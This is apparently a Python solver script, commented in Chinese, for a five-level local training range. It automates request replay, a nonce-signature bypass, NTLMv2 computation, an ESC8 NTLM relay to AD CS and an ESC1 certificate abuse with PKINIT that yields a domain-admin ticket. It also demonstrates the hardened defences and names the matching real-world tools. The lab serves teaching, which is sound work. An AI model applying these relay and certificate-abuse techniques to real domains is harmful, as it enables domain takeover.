#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
exp.py —— replay / AD CS 五关一键验证，纯标准库，零依赖

用法：
    python3 poc/exp.py                       # 五关全跑（自动探测 8910 / 8080）
    python3 poc/exp.py --only L4             # 只跑 ESC8 中继
    python3 poc/exp.py --base http://127.0.0.1:8080

脚本刻意把每一步的中间报文都打出来，重点看 L4：
    拿到的永远是 base64 字节，没有密码、没有 NT hash。
    这跟真机里 ntlmrelayx 做的事是同一件。

依赖：同级目录上一层的 ntlm.py（负责 MD4 / NTLMv2 / 三种消息编解码）。
"""

import argparse
import base64
import json
import os
import sys
import time
import urllib.error
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import ntlm  # noqa: E402

BASE = ""


# ---------------------------------------------------------------------------
#  HTTP 工具：401 不是异常场景，NTLM Type2 就藏在 401 的响应里，
#  所以这里把 HTTPError 也当成一次正常返回，连 header 一起带回来。
# ---------------------------------------------------------------------------

def request(method, path, body=None, headers=None):
    data = json.dumps(body, ensure_ascii=False).encode("utf-8") if body is not None else None
    hdrs = {"Accept": "application/json"}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    hdrs.update(headers or {})
    req = urllib.request.Request(BASE + path, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            raw, status, h = resp.read(), resp.status, dict(resp.headers)
    except urllib.error.HTTPError as exc:
        raw, status, h = exc.read(), exc.code, dict(exc.headers)
    try:
        parsed = json.loads(raw.decode("utf-8"))
    except (ValueError, UnicodeDecodeError):
        parsed = {"raw": raw.decode("utf-8", "replace")[:200]}
    return status, h, parsed


def header_get(headers, name):
    """HTTPMessage 的键大小写不保证，统一按小写找。"""
    for key, value in headers.items():
        if key.lower() == name.lower():
            return value
    return None


def b64e(raw):
    return base64.b64encode(raw).decode("ascii")


def b64d(text):
    return base64.b64decode(text)


def title(text):
    print("\n" + "=" * 66)
    print("  " + text)
    print("=" * 66)


def flag(level, value):
    print("  [FLAG L%d] %s" % (level, value))
    return value


def check(condition, message):
    if not condition:
        raise AssertionError(message)


def detect_base(explicit):
    """集成编排在 8910，本地直接跑 server.py 在 8080，都试一遍。"""
    if explicit:
        return explicit.rstrip("/")
    for candidate in ("http://127.0.0.1:8910", "http://127.0.0.1:8080"):
        try:
            with urllib.request.urlopen(candidate + "/", timeout=2) as resp:
                if resp.status == 200:
                    return candidate
        except Exception:
            continue
    raise SystemExit("连不上靶场。先跑 ./setup.sh（或 python3 server.py），"
                     "也可以用 --base 指定地址。")


# ---------------------------------------------------------------------------
#  L1：重放一条「抓到的合法请求」。
#  关键点：签名是对的、金额是对的、会话也是对的，服务端却没有任何依据
#  判断这条报文是不是第二次到达。重放攻击从来不需要破解签名。
# ---------------------------------------------------------------------------

def level1():
    title("L1 · 无防重放：把一条抓包报文发五次")
    status, _, sample = request("GET", "/bank/sample?level=1")
    check(status == 200, "拿样本失败")
    body = sample["body"]
    print("  抓到的报文 : %s" % json.dumps(body, ensure_ascii=False))
    print("  签名算法   : HMAC-MD5(from|to|amount)  —— 没有 nonce / 时间戳 / 序号")
    for i in range(1, 6):
        status, _, out = request("POST", "/bank/l1/transfer", body)
        check(status == 200 and out.get("ok"), "第 %d 次转账失败：%s" % (i, out))
        print("  第 %d 次   : 收款累计 %d，余额 %d" %
              (i, out["received"], out["balance"]))
    check("flag" in out, "五次之后没拿到 flag")
    return flag(1, out["flag"])


# ---------------------------------------------------------------------------
#  L2：服务端加了 nonce 去重和时间戳，看起来"修好了"。
#  但签名仍只覆盖 from|to|amount —— nonce 是签名之外的自由字段，
#  换个值就能绕过去重表，签名还照样有效。
#  防重放三要素：签名覆盖全部字段 / nonce 一次性 / 时间窗够窄，缺一不可。
# ---------------------------------------------------------------------------

def level2():
    title("L2 · 假 nonce：服务端去重了，但 nonce 没进签名")
    status, _, sample = request("GET", "/bank/sample?level=2")
    check(status == 200, "拿样本失败")
    base = sample["body"]
    print("  原始报文   : nonce=%s  sig=%s…" % (base["nonce"], base["sig"][:12]))
    print("  注意       : 这个 sig 跟 L1 一模一样 —— nonce / ts 根本没进签名")
    # 先证明「原样重放」确实被 nonce 去重挡住
    status, _, out = request("POST", "/bank/l2/transfer", base)
    print("  原样发一次 : ok=%s" % out.get("ok"))
    status, _, again = request("POST", "/bank/l2/transfer", base)
    check(status == 409, "原样重放居然没被挡，关卡逻辑不对")
    print("  原样再发   : %d %s  ← 去重生效" % (status, again.get("error")))

    out = None
    for i in range(1, 6):
        body = dict(base)
        body["nonce"] = os.urandom(8).hex()   # 只改 nonce，签名一个字都不动
        body["ts"] = int(time.time())
        status, _, out = request("POST", "/bank/l2/transfer", body)
        check(status == 200 and out.get("ok"), "第 %d 次失败：%s" % (i, out))
        print("  换 nonce %d : 收款累计 %d" % (i, out["received"]))
    check(out and "flag" in out, "没拿到 L2 flag")
    return flag(2, out["flag"])


# ---------------------------------------------------------------------------
#  L3：亲手算一次 NTLMv2，把「密码 → NT hash → NTOWFv2 → NTProofStr」走通。
#  这一步是理解 relay 的前提：服务端验签时用的也是 hash，不是明文密码；
#  而且 challenge 是服务端现给的，客户端只是拿它算了个 HMAC。
# ---------------------------------------------------------------------------

def level3():
    title("L3 · 自己算一次 NTLMv2 Type3")
    t1 = ntlm.build_type1("LAB", "CLIENT")
    print("  Type1      : %d 字节, domain=%s workstation=%s" %
          (len(t1), ntlm.parse_type1(t1)["domain"], "CLIENT"))
    status, _, out = request("POST", "/ntlm/l3/type1", {"type1": b64e(t1)})
    check(status == 200, "拿 Type2 失败：%s" % out)
    t2 = b64d(out["type2"])
    info = ntlm.parse_type2(t2)
    print("  Type2      : %d 字节, challenge=%s" %
          (len(t2), info["challenge"].hex()))
    print("  TargetInfo : %s" %
          ", ".join(ntlm.AV_NAMES.get(i, str(i)) for i, _ in info["av_pairs"]))

    ntsk = ntlm.nt_hash("Passw0rd!")
    print("  NT hash    : MD4(UTF16LE(Passw0rd!)) = %s" % ntsk.hex())
    t3 = ntlm.make_type3_from_type2(ntsk, "alice", "LAB", t2, "CLIENT")
    parsed = ntlm.parse_type3(t3)
    print("  Type3      : %d 字节, 身份=%s\\%s, NTResponse=%d 字节" %
          (len(t3), parsed["domain"], parsed["user"],
           len(parsed["nt_response"])))
    print("  NTProofStr : %s…  ← HMAC_MD5(NTOWFv2, challenge + temp)" %
          parsed["nt_response"][:16].hex())

    status, _, out = request("POST", "/ntlm/l3/type3",
                             {"sid": out["sid"], "type3": b64e(t3)})
    check(status == 200 and out.get("ok"), "验签失败：%s" % out)
    result = flag(3, out["flag"])
    # challenge 用后即删：同一个 Type3 再交一次应当被拒
    status, _, replay = request("POST", "/ntlm/l3/type3",
                                {"sid": "", "type3": b64e(t3)})
    print("  重放 Type3 : %d %s  ← challenge 本身就是一次性的 nonce" %
          (status, replay.get("error")))
    return result


# ---------------------------------------------------------------------------
#  L4：ESC8 中继。四步，每步都只搬运 base64 字节。
#    victim Type1 → CA 换 Type2 → victim 算 Type3 → CA 验签通过
#  脚本里没有任何一处出现 DC$ 的密码或 NT hash —— 那只在服务端内部。
#  真机对应：PetitPotam 触发认证 + ntlmrelayx -t http://ca/certsrv/certfnsh.asp --adcs
# ---------------------------------------------------------------------------

def do_relay(verbose=True):
    def say(text):
        if verbose:
            print("  " + text)

    status, _, out = request("POST", "/victim/negotiate", {})
    check(status == 200, "victim 协商失败")
    vid, t1b64 = out["vid"], out["type1"]
    say("① victim 发起认证 : Type1 %d 字节  (身份 %s)" %
        (len(b64d(t1b64)), out["identity"]))

    status, headers, out = request(
        "POST", "/certsrv/certfnsh.asp", {},
        {"Authorization": "NTLM " + t1b64},
    )
    check(status == 401 and out.get("stage") == "type2",
          "CA 没返回 Type2：%s %s" % (status, out))
    t2b64 = out["type2"]
    cid = header_get(headers, "X-NTLM-Challenge") or out["cid"]
    www = header_get(headers, "WWW-Authenticate") or ""
    say("② 转发给 CA       : 401 WWW-Authenticate: NTLM %s…" % www[5:21])
    say("   CA 现给 challenge = %s" % out["challenge_hex"])

    status, _, out = request("POST", "/victim/authenticate",
                             {"vid": vid, "type2": t2b64})
    check(status == 200, "victim 算 Type3 失败：%s" % out)
    t3b64 = out["type3"]
    say("③ Type2 交给 victim: 换回 Type3 %d 字节（victim 自己算的）" %
        len(b64d(t3b64)))

    status, _, out = request(
        "POST", "/certsrv/certfnsh.asp", {},
        {"Authorization": "NTLM " + t3b64, "X-NTLM-Challenge": cid},
    )
    check(status == 200 and out.get("ok"), "CA 验签失败：%s %s" % (status, out))
    say("④ Type3 转发回 CA  : 认证为 %s" % out["authenticated_as"])
    say("   全程只有字节：没输入密码，也没见过 NT hash。")
    return out


def level4():
    title("L4 · ESC8：只搬字节把 DC 的认证中继到 AD CS")
    out = do_relay()
    return flag(4, out["flag"]), out["ca_session"]


# ---------------------------------------------------------------------------
#  L5：ESC1 + PKINIT。
#  模板允许注册者自填 SAN，于是以 DC$ 的身份申请了一张写着
#  administrator@lab.local 的证书；KDC 照着 SAN 里的 UPN 做映射，
#  把 Domain Admins 塞进 PAC —— 提权就发生在「信任 CA 写的身份」这一步。
# ---------------------------------------------------------------------------

def level5(ca_session=None):
    title("L5 · ESC1 证书 + PKINIT 换域管 TGT")
    if ca_session is None:
        print("  （--only L5：先自动跑一遍 relay 拿 CA 会话）")
        ca_session = do_relay(verbose=False)["ca_session"]

    status, _, templates = request("GET", "/certsrv/templates")
    vuln = templates["templates"]["VulnWebServer"]
    print("  模板 VulnWebServer : subject可自填=%s, EKU=%s, 需审批=%s" %
          (vuln["enrollee_supplies_subject"], ",".join(vuln["eku"]),
           vuln["manager_approval"]))

    status, _, out = request(
        "POST", "/certsrv/certfnsh.asp",
        {"template": "VulnWebServer", "subject": "CN=dc$",
         "san": "upn=administrator@lab.local"},
        {"X-CA-Session": ca_session},
    )
    check(status == 200 and out.get("ok"), "证书申请失败：%s" % out)
    cert_b64 = out["cert"]
    cert = out["cert_view"]
    print("  证书 serial=%s  subject=%s" % (cert["serial"], cert["subject"]))
    print("  SAN=%s  ← 这就是 ESC1 的提权点" % cert["san"])
    print("  CA 签名 : %s…  (真机是 CA 私钥签的 X.509)" % cert["ca_sig"][:16])

    status, _, out = request("POST", "/kdc/asktgt", {"cert": cert_b64})
    check(status == 200 and out.get("ok"), "PKINIT 换 TGT 失败：%s" % out)
    tgt = out["tgt_view"]
    print("  TGT     : user=%s  groups=%s" %
          (tgt["user"], ",".join(tgt["groups"][:2])))

    status, _, out = request("GET", "/admin", None, {"X-TGT": out["tgt"]})
    check(status == 200 and out.get("ok"), "域管页面没进去：%s" % out)
    result = flag(5, out["flag"])

    # 修复对照：同一张证书打到加固后的 KDC，应该被强证书映射挡下
    status, _, safe = request("POST", "/kdc/safe/asktgt", {"cert": cert_b64})
    check(status == 403, "加固 KDC 居然放行了弱证书映射：%s" % safe)
    print("  加固 KDC: %d %s  ← KB5014754 强证书映射" %
          (status, safe.get("error")))
    return result


def show_safe():
    title("修复对照 · 同一批攻击在加固实现上的结果")
    status, _, out = request("GET", "/safe/check")
    if status != 200:
        print("  /safe/check 不可用：%s" % out)
        return
    for i, item in enumerate(out["checks"], 1):
        tag = "实测" if item.get("kind") == "measured" else "加固清单"
        print("  %d. [%s] %s" % (i, tag, item["attack"]))
        for reason in item["blocked_by"]:
            print("       × %s" % reason)
        if item.get("first_attempt"):
            print("       · 第一次请求：%s" % item["first_attempt"])
    print("  " + out["summary"])


def main():
    global BASE
    parser = argparse.ArgumentParser(description="replay / AD CS 五关验证")
    parser.add_argument("--base", default="", help="靶场地址，默认自动探测 8910 / 8080")
    parser.add_argument("--only", default="", choices=["L1", "L2", "L3", "L4", "L5"],
                        help="只跑某一关")
    parser.add_argument("--no-safe", action="store_true", help="不打印修复对照")
    args = parser.parse_args()

    BASE = detect_base(args.base)
    print("[+] 靶场地址: %s" % BASE)

    collected = {}
    session = None
    wanted = args.only

    if not wanted or wanted == "L1":
        collected["L1"] = level1()
    if not wanted or wanted == "L2":
        collected["L2"] = level2()
    if not wanted or wanted == "L3":
        collected["L3"] = level3()
    if not wanted or wanted == "L4":
        value, session = level4()
        collected["L4"] = value
    if not wanted or wanted == "L5":
        collected["L5"] = level5(session)

    if not args.no_safe:
        show_safe()

    title("结果汇总")
    for key in ("L1", "L2", "L3", "L4", "L5"):
        if key in collected:
            print("  %s  %s" % (key, collected[key]))
    print("\n  五关串起来就是：重放 → NTLM 认证 → 中继 → 证书 → 域管。")
    print("  真机对应见 README.md 的「真机对照」表。\n")


if __name__ == "__main__":
    try:
        main()
    except AssertionError as exc:
        print("\n[x] 断言失败：%s" % exc, file=sys.stderr)
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] 已中断", file=sys.stderr)
        sys.exit(130)
